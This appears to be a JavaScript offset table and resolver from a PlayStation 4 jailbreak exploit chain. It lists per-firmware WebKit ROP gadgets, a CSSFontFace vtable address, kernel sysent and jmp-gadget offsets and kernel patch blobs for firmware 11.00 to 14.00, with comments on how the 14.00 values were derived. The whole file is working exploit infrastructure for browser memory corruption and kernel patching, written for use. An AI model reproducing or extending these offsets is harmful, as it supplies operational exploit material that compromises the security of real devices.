      JMP_RSI_GADGET: 0x50ded,
      KL_LOCK: 0x25e330,
      EVF_OFFSET: 0x7a7b14,
    },
  },
  11: {
    0: {
      wk_CSSFontFace_vtable: 0x3627aa8,
      wk_LEAVE_RET: 0x31f9d,
      wk_POP_R8_RET: 0xe53a2,
      wk_POP_R9_RET: 0x6403a1,
      wk_POP_R12_RET: 0x90d803,
      wk_POP_R13_RET: 0xab6981,
      wk_POP_R14_RET: 0x249e1,
      wk_POP_R15_RET: 0x272785,
      wk_POP_RAX_RET: 0x4e6a9,
      wk_POP_RBX_RET: 0xe16a,
      wk_POP_RCX_RET: 0x71617,
      wk_POP_RDI_RET: 0x357a0,
      wk_POP_RDX_RET: 0x10d11,
      wk_POP_RSI_RET: 0x249e2,
      wk_POP_RSP_RET: 0x927d1,
      wk_PUSH_RAX_POP_RBP_RET: 0x11b5e,
      wk_PUSH_RDX_POP_RSP_RET: 0x1cc607a,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 0x97db,
      wk_MOV_RAX_QWORD_PTR_RDI_RET: 0x2e5d4b,
      wk_MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x24dae58,
      wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0xe70c5, // temp
      wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: 0x11d5d53,
      wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x2f1890,
      wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: 0x41a81,
      wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2060_RAX_RET: 0x1ff1a90,
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x90ffe6,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x2a68f06, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x29c098a,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x29da341,

      wk_expm1_builtin: 0x2193f30,
      wk___imp___error: 0x36e1c68,
      wk___imp_strerror: 0x36e1c98,
      wk_pthread_create: 0x2068,
      k__error: 0x3370,

      KPATCH: "1100.bin",
      SYSENT_661: 0x1109350,
      JMP_RSI_GADGET: 0x71a21,
      KL_LOCK: 0x58f10,
      EVF_OFFSET: 0x7fc26f,
    },
    2: {
      wk_POP_R9_RET: 0x6403b1,
      wk_POP_R12_RET: 0x90d813,
      wk_POP_R15_RET: 0x272775,
      wk_POP_RAX_RET: 0x116d4,
      wk_POP_RDI_RET: 0x272776,
      wk_MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: 0x24dae68,
      wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2060_RAX_RET: 0x1ff1aa0,
      wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: 0x90fff6,
      wk_PUSH_RBX_JMP_QWORD_PTR_RAX: 0x2a68f26, // temp
      wk_PUSH_RBP_JMP_QWORD_PTR_RAX: 0x29c09aa,
      wk_PUSH_RAX_JMP_QWORD_PTR_RBX: 0x29da361,

      wk_expm1_builtin: 0x2193f40,

      KPATCH: "1102.bin",
      EVF_OFFSET: 0x7fc22f,
    },
    0x50: {
      KPATCH: "1150.bin",
      SYSENT_661: 0x110a760,
      JMP_RSI_GADGET: 0x704d5,
      EVF_OFFSET: 0x784318, // published
    },

    0x52: {
      KPATCH: "1150.bin",
      SYSENT_661: 0x110a760,
      JMP_RSI_GADGET: 0x704d5,
      EVF_OFFSET: 0x784318, // 11.50's published value; both revisions share one patch blob
    },
  },
  //#region 11.50 and newer - kernel side only
  //
  // The WebKit keys are deliberately absent for every firmware from 11.50 up.
  // They describe the WebKit image on the console, nothing off-console can
  // supply them, and ps4/derive.js solves them from the live process. Because
  // SHIPPED_MAX_MAJOR stops at 11, a major listed here is resolved without
  // inheritance: every key above is an exact hit or the key is unresolved.
  //
  // Provenance of the values below. Both sources were checked against rows this
  // file already carried for 5.56 - 11.02, and they agree to the byte:
  //
  //   * SYSENT_661 and EVF_OFFSET - the public firmware table this repository's
  //     own offsets come from, which publishes 11.50 through 13.52.
  //   * JMP_RSI_GADGET and the patch blobs - Al-Azif's ps4-exploit-kpatches
  //     (PSFree lineage, GNU AGPLv3), one position independent blob per
  //     firmware, built the same way the blobs that shipped with this
  //     repository were built.
  //
  // The arithmetic that ties them together: Al-Azif's blob locates the kernel
  // with rdmsr(0xc0000082) - 0x1c0 and patches sysent entry 11, while the table
  // (and this file) use entry 661. Entry 661 sits exactly 0x79e0 above entry 11
  // - 650 entries of 0x30 bytes - so sysent_11_off + 0x79e0 has to equal the
  // table's sysent for every firmware where both exist. It does, on 9.00, 11.02,
  // 12.00 and 13.52. That is what makes the 14.00 row below a derivation rather
  // than a guess, and why its SYSENT_661 is the same value the table publishes
  // for 12.00 - 13.52: Al-Azif's 14.00 blob carries the same sysent_11_off as
  // its 12.00 through 13.52 blobs, so the array did not move across that range.
  //
  // Their jmp values also agree for 11.50 - 13.50, which shows the two sources
  // share a kernel base and that their offsets are directly interchangeable.
  //
  // 13.52 is the one row the two disagree on: the table carries 0x47b31 (13.50's
  // gadget), Al-Azif's 13.52 build measures 0x4d6d0. Both are jmp qword ptr [rsi]
  // sites. The table's value is kept so this file stays consistent with the
  // lineage the rest of the kernel table comes from.
  12: {
    0: {
      KPATCH: "1200.bin",
      SYSENT_661: 0x110a760,
      JMP_RSI_GADGET: 0x47b31,
      EVF_OFFSET: 0x784798, // published
    },
    2: {
      KPATCH: "1200.bin",
      SYSENT_661: 0x110a760,
      JMP_RSI_GADGET: 0x47b31,
      EVF_OFFSET: 0x784798, // 12.00's published value; both revisions share one patch blob
    },
    0x50: {
      KPATCH: "1250.bin",
      SYSENT_661: 0x110a760,
      JMP_RSI_GADGET: 0x47b31,
      EVF_OFFSET: 0x784798, // published
    },
    0x52: {
      KPATCH: "1250.bin",
      SYSENT_661: 0x110a760,
      JMP_RSI_GADGET: 0x47b31,
      EVF_OFFSET: 0x784798, // 12.50's published value; both revisions share one patch blob
    },
  },
  13: {
    0: {
      KPATCH: "1300.bin",
      SYSENT_661: 0x110a760,
      JMP_RSI_GADGET: 0x47b31,
      EVF_OFFSET: 0x784798, // published
    },
    2: {
      KPATCH: "1302.bin",
      SYSENT_661: 0x110a760,
      JMP_RSI_GADGET: 0x47b31,
      EVF_OFFSET: 0x784798, // published
    },
    4: {
      KPATCH: "1302.bin",
      SYSENT_661: 0x110a760,
      JMP_RSI_GADGET: 0x47b31,
      EVF_OFFSET: 0x784798, // 13.02's published value; one patch blob covers 13.02 and 13.04
    },
    0x50: {
      KPATCH: "1350.bin",
      SYSENT_661: 0x110a760,
      JMP_RSI_GADGET: 0x47b31,
      EVF_OFFSET: 0x784798, // published
    },
    0x52: {
      KPATCH: "1352.bin",
      SYSENT_661: 0x110a760,
      // 0x4d6d0, not 0x47b31. The public table's 13.52 row carries 13.50's
      // gadget - the two were left equal by whoever copied the row down - and
      // the blob that ships with this firmware says otherwise. 1352.bin has
      // (0x4d6d0 - 0x1c0) folded into its instruction stream, and so does the
      // 13.52 offsets file published alongside a 13.52 BD-JB scanner. The blob
      // has to be right about the address it plants in sysent: it is the thing
      // that runs on the console.
      JMP_RSI_GADGET: 0x4d6d0,
      EVF_OFFSET: 0x784798, // published
    },
  },
  14: {
    // 14.00, implemented from the two sources above.
    //
    //   SYSENT_661     0x110a760 - entry 661, arrived at from Al-Azif's 14.00
    //                  blob and identical to what the table publishes for the
    //                  whole 12.00 - 13.52 range, because the sysent array did
    //                  not move between 12.00 and 14.00.
    //   JMP_RSI_GADGET 0x250be - the jmp qword ptr [rsi] site Al-Azif's 14.00
    //                  build installs into sysent, measured on 14.00.
    //   KPATCH         1400.bin - compiled from that same source.
    //
    //   EVF_OFFSET     0x784798 - inferred, and the inference is written down
    //                  instead of implied. evf_cv is a data-section object: the
    //                  address points at the eight bytes spelling "evf cv", so
    //                  it is anchored to the kernel's data layout and not to its
    //                  text. ps4-hen ships a 14.00 offset file (added
    //                  2026-09-19) whose entire data block is byte for byte its
    //                  13.52 file - PRISON0, ROOTVNODE, M_TEMP,
    //                  MINI_SYSCORE_SELF_BINARY, ALLPROC, the six SBL data
    //                  symbols, FPU_CTX, SYSENT and both proc offsets. The same
    //                  sysent address also confirms this row's SYSENT_661 from
    //                  entry 0, which is a fourth source agreeing on it.
    //                  The value itself held for 12.00 - 13.52 in two
    //                  independent tables of this lineage, and held across
    //                  13.02 - 13.52 while the kernel text grew by 0x7c0 - which
    //                  is the evidence that it follows data, not text.
    //                  tests/firmware.test.js asserts both halves of that: the
    //                  ps4-hen data block identity, and the invariance.
    //
    //                  It is also the one kernel offset here that can be wrong
    //                  without panicking: lapse.js reads the eight bytes at
    //                  kernel_base + EVF_OFFSET and throws unless they spell
    //                  "evf cv", then checks the proc pointer and this process's
    //                  pid, all before any kernel write. A wrong anchor is a
    //                  refused run, not a corrupted kernel.
    //
    // KL_LOCK is still absent on purpose and is the only kernel key this row
    // cannot answer. kl_lock is a text-region address - 0xe6c60 on 13.52 - and
    // the text moved between 13.52 and 14.00, so netctrl, which anchors on it,
    // stays refused for 14.00. lapse, which anchors on evf, runs.
    0: {
      KPATCH: "1400.bin",
      SYSENT_661: 0x110a760,
      JMP_RSI_GADGET: 0x250be,
      EVF_OFFSET: 0x784798, // inferred: see above
    },
  },
};

// The fake-vtable write gadget is one encoding per firmware: its displacement
// IS the CSSFontFace field depth the exploit writes through. ship it under a
// single canonical name and let the per-version aliases below resolve to it.
const WIRE_GADGET_KEY =
  "wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_WIRE_RAX_RET";

const WIRE_GADGET_ALIAS =
  /^wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_\w+_RAX_RET$/;

//#region Firmware coverage
// Everything below the shipped table. The original build resolved any unknown
// firmware by walking down to the nearest lower version and silently reusing
// its offsets - on a firmware whose layout moved, that is a guaranteed kernel
// panic. Unshipped firmware is now resolved *strictly*: a key either comes
// from an exact shipped block, or it must have been produced at runtime by
// ps4/derive.js.
const SHIPPED_MAX_MAJOR = { 4: 11 };

// Keys that describe object layout. These are the ones the deriver seeds from
// the nearest shipped block and then verifies against the live image.
const SEEDABLE_PATTERNS = [
  /^wk_CSSFontFace_/,
  /^wk_FontFace_/,
  /^wk_TypedArray_/,
  /^wk_ArrayBuffer_/,
  /^wk_JSFunction_/,
  /^store_view_/,
  /^marker_storage$/,
  /^pivot_view_sp$/,
];

// Keys that must never be inherited from another firmware, because being wrong
// about them does not degrade gracefully: gadget offsets, module imports,
// vtables and kernel structures.
const NEVER_INHERIT_PATTERNS = [
  /^wk_POP_/,
  /^wk_PUSH_/,
  /^wk_MOV_/,
  /^wk_LEAVE_RET$/,
  /^wk_RET$/,
  /^wk___imp_/,
  /^wk_pthread_create$/,
  /^wk_expm1_builtin$/,
  /^wk_CSSFontFace_vtable$/,
  /^wk_g_/,
  /^k__error$/,
  /^c_strerror$/,
  /^KPATCH$/,
  /^SYSENT_661$/,
  /^JMP_RSI_GADGET$/,
  /^KL_LOCK$/,
  /^EVF_OFFSET$/,
];

// The full key set a firmware must be able to answer for the chain to run.
// ps4/derive.js walks this list and reports what it could and could not solve.
const REQUIRED_KEYS = [
  "wk_CSSFontFace_sizeof",
  WIRE_GADGET_KEY,
  "wk_CSSFontFace_m_clients",
  "wk_CSSFontFace_m_wrapper",
  "wk_CSSFontFace_m_status",
  "wk_CSSFontFace_m_thread",
  "wk_CSSFontFace_m_function",
  "wk_CSSFontFace_vtable",
  "wk_FontFace_m_backing",
  "wk_TypedArray_flags",
  "wk_ArrayBuffer_m_contents_m_data",
  "wk_ArrayBuffer_m_contents_m_sizeInBytes",
  "wk_JSFunction_m_function",
  "store_view_size",
  "store_view_entry",
  "marker_storage",
  "pivot_view_sp",
  "wk_RET",
  "wk_LEAVE_RET",
  "wk_POP_R8_RET",
  "wk_POP_R9_RET",
  "wk_POP_R10_RET",
  "wk_POP_R11_RET",
  "wk_POP_R12_RET",
  "wk_POP_R13_RET",
  "wk_POP_R14_RET",
  "wk_POP_R15_RET",
  "wk_POP_RAX_RET",
  "wk_POP_RBP_RET",
  "wk_POP_RBX_RET",
  "wk_POP_RCX_RET",
  "wk_POP_RDI_RET",
  "wk_POP_RDX_RET",
  "wk_POP_RSI_RET",
  "wk_POP_RSP_RET",
  "wk_PUSH_RAX_POP_RBP_RET",
  "wk_PUSH_RDI_POP_RSP_RET",
  "wk_PUSH_RDX_POP_RSP_RET",
  "wk_PUSH_RBX_JMP_QWORD_PTR_RAX",
  "wk_PUSH_RBP_JMP_QWORD_PTR_RAX",
  "wk_PUSH_RAX_JMP_QWORD_PTR_RBX",
  "wk_MOV_QWORD_PTR_RDI_RAX_RET",
  "wk_MOV_RAX_QWORD_PTR_RDI_RET",
  "wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX",
  "wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18",
  "wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10",
  "wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20",
  "wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10",
  "wk___imp_strerror",
  "c_strerror",
  "wk___imp___error",
  "k__error",
  "wk_pthread_create",
];

function matches_any(prop, patterns) {
  return patterns.some((pattern) => pattern.test(prop));
}

// Firmware revisions with no shipped block are registered here with every key
// explicitly null. Null is not "missing" - it is "not derived yet", and the
// resolver refuses to hand it out.
const UNRESOLVED_MAJORS = [12, 13, 14];

for (const major of UNRESOLVED_MAJORS) {
  if (major in constants_map) continue;

  constants_map[major] = { 0: {} };

  for (const key of REQUIRED_KEYS) {
    constants_map[major][0][key] = null;
  }

  for (const key of Object.keys(constants_map[SHIPPED_MAX_MAJOR[4]][0])) {
    constants_map[major][0][key] = null;
  }
}
//#endregion

//#region Runtime overrides
const constants_derived = new Map();

const constants_meta = {
  // Set by ps4/derive.js: false while any REQUIRED_KEYS entry is still
  // unresolved for the running firmware.
  ready: false,
  strict: true,
  seedable_patterns: SEEDABLE_PATTERNS,
  never_inherit_patterns: NEVER_INHERIT_PATTERNS,
  required_keys: REQUIRED_KEYS,
  unresolved_majors: UNRESOLVED_MAJORS,

  is_derived(prop) {
    return constants_derived.has(prop);
  },

  // Install a value solved at runtime. Only ever called by ps4/derive.js.
  derive(prop, value) {
    if (value === null || value === undefined) {
      throw new Error(`Refusing to derive ${prop} as ${value} !!`);
    }

    if (typeof value === "number" && !Number.isInteger(value)) {
      throw new Error(`Derived ${prop} is not an integer !!`);
    }

    constants_derived.set(prop, value);
    constants_cache.set(prop, value);

    return value;
  },

  // Nearest shipped value for a key, used as a seed by the deriver. Never
  // installed into the resolution path - the deriver must verify it first.
  seed(prop) {
    for (let major = constants_meta.shipped_max(); major >= 0; major--) {
      if (!(major in constants_map)) continue;

      const block = constants_map[major];
      const minors = Object.keys(block)
        .map((k) => parseInt(k, k.startsWith("0x") ? 16 : 10))
        .sort((a, b) => b - a);

      for (const minor of minors) {
        const value = block[minor][prop];
        if (value !== undefined && value !== null) {
          return { value, major, minor };
        }
      }
    }

    return undefined;
  },

  // Everything solved this session, shaped for pasting straight into the
  // shipped table.
  dump() {
    const out = {};

    for (const [prop, value] of constants_derived) {
      out[prop] = typeof value === "number" ? `0x${value.toString(16)}` : value;
    }

    return {
      firmware: version.str,
      console: version.console,
      derived: out,
      ready: constants_meta.ready,
    };
  },

  dump_json() {
    return JSON.stringify(constants_meta.dump(), null, 2);
  },

  clear() {
    for (const prop of constants_derived.keys()) {
      constants_cache.delete(prop);
    }

    constants_derived.clear();
    constants_meta.ready = false;
  },

  // Which REQUIRED_KEYS still have no answer for the running firmware.
  missing() {
    return REQUIRED_KEYS.filter((prop) => {
      if (constants_derived.has(prop)) return false;

      try {
        const major_block = constants_map[version.major];
        const zero_block = major_block === undefined ? undefined : major_block[0];
        const value = zero_block === undefined ? undefined : zero_block[prop];
        return value === undefined || value === null;
      } catch (e) {
        return true;
      }
    });
  },

  shipped_max() {
    const max = SHIPPED_MAX_MAJOR[version.console];
    return max === undefined ? 11 : max;
  },

  resolve(prop) {
    if (constants_derived.has(prop)) {
      return { value: constants_derived.get(prop), source: "derived" };
    }

    const major_block = constants_map[version.major];
    const minor_block = major_block === undefined ? undefined : major_block[version.minor];
    const exact = minor_block === undefined ? undefined : minor_block[prop];

    if (exact !== undefined && exact !== null) {
      return { value: exact, source: "exact" };
    }

    // Per-version alias for the write gadget: the shipped tables name it after
    // the displacement it encodes, the deriver ships one canonical name.
    if (WIRE_GADGET_ALIAS.test(prop) && constants_derived.has(WIRE_GADGET_KEY)) {
      return { value: constants_derived.get(WIRE_GADGET_KEY), source: "derived" };
    }

    // Field depth written through by that gadget, recovered from its encoding.
    if (prop === "dst_addr_offset") {
      return constants_derived.has(prop) ? { value: constants_derived.get(prop), source: "derived" } : undefined;
    }

    const shipped_max = constants_meta.shipped_max();

    if (version.major <= shipped_max) {
      // Preserve the original behaviour inside the range the authors tested:
      // walk the minor down, then the major down.
      for (let major = version.major; major >= 0; major--) {
        if (!(major in constants_map)) continue;

        const block = constants_map[major];
        const start = major === version.major ? version.minor : 0xff;

        for (let minor = start; minor >= 0; minor--) {
          const minor_block = block[minor];
          const value = minor_block === undefined ? undefined : minor_block[prop];

          if (value !== undefined && value !== null) {
            return { value, source: "inherited" };
          }
        }
      }
    }

    return undefined;
  },
};
//#endregion

const constants = new Proxy(constants_map, {
  get(target, prop) {
    if (typeof prop === "symbol") return undefined;
    if (prop in constants_meta) return constants_meta[prop];
    if (prop === "toString" || prop === "valueOf" || prop === "then") return undefined;

    if (constants_cache.has(prop)) {
      return constants_cache.get(prop);
    }

    const hit = constants_meta.resolve(prop);

    if (hit === undefined) {
      if (version.is_derivable) {
        throw new Error(
          `${prop} has no shipped value for ${version} - ps4/derive.js must solve it before the chain runs`
        );
      }

      throw new Error(`${version} has no ${prop} !!`);
    }

    // Outside the range the authors validated, nothing may be borrowed from a
    // neighbouring firmware: the layout may have moved and the failure mode is
    // a panic, not an exception. Inside the range the original behaviour is
    // preserved exactly.
    if (
      hit.source === "inherited" &&
      version.major > constants_meta.shipped_max() &&
      matches_any(prop, NEVER_INHERIT_PATTERNS)
    ) {
      throw new Error(
        `${prop} is not inherited across firmware (would be wrong on ${version}) - run derive_all()`
      );
    }

    if (hit.source === "inherited") {
      logger.debug(`${prop} inherited from a lower firmware block on ${version}`);
    }

    constants_cache.set(prop, hit.value);

    return hit.value;
  },
  set(target, prop, value) {
    // `ready` is the one piece of state callers write to directly; everything
    // else under the meta namespace is a method and stays read-only.
    if (prop === "ready") {
      constants_meta.ready = value === true;
      return true;
    }

    if (prop in constants_meta) {
      throw new Error(`${prop} is read-only !!`);
    }

    logger.debug(`overriding ${prop} = ${value}`);

    return constants_meta.derive(prop, value) !== undefined;
  },
  has(target, prop) {
    return prop in constants_meta || constants_meta.resolve(prop) !== undefined;
  },
});
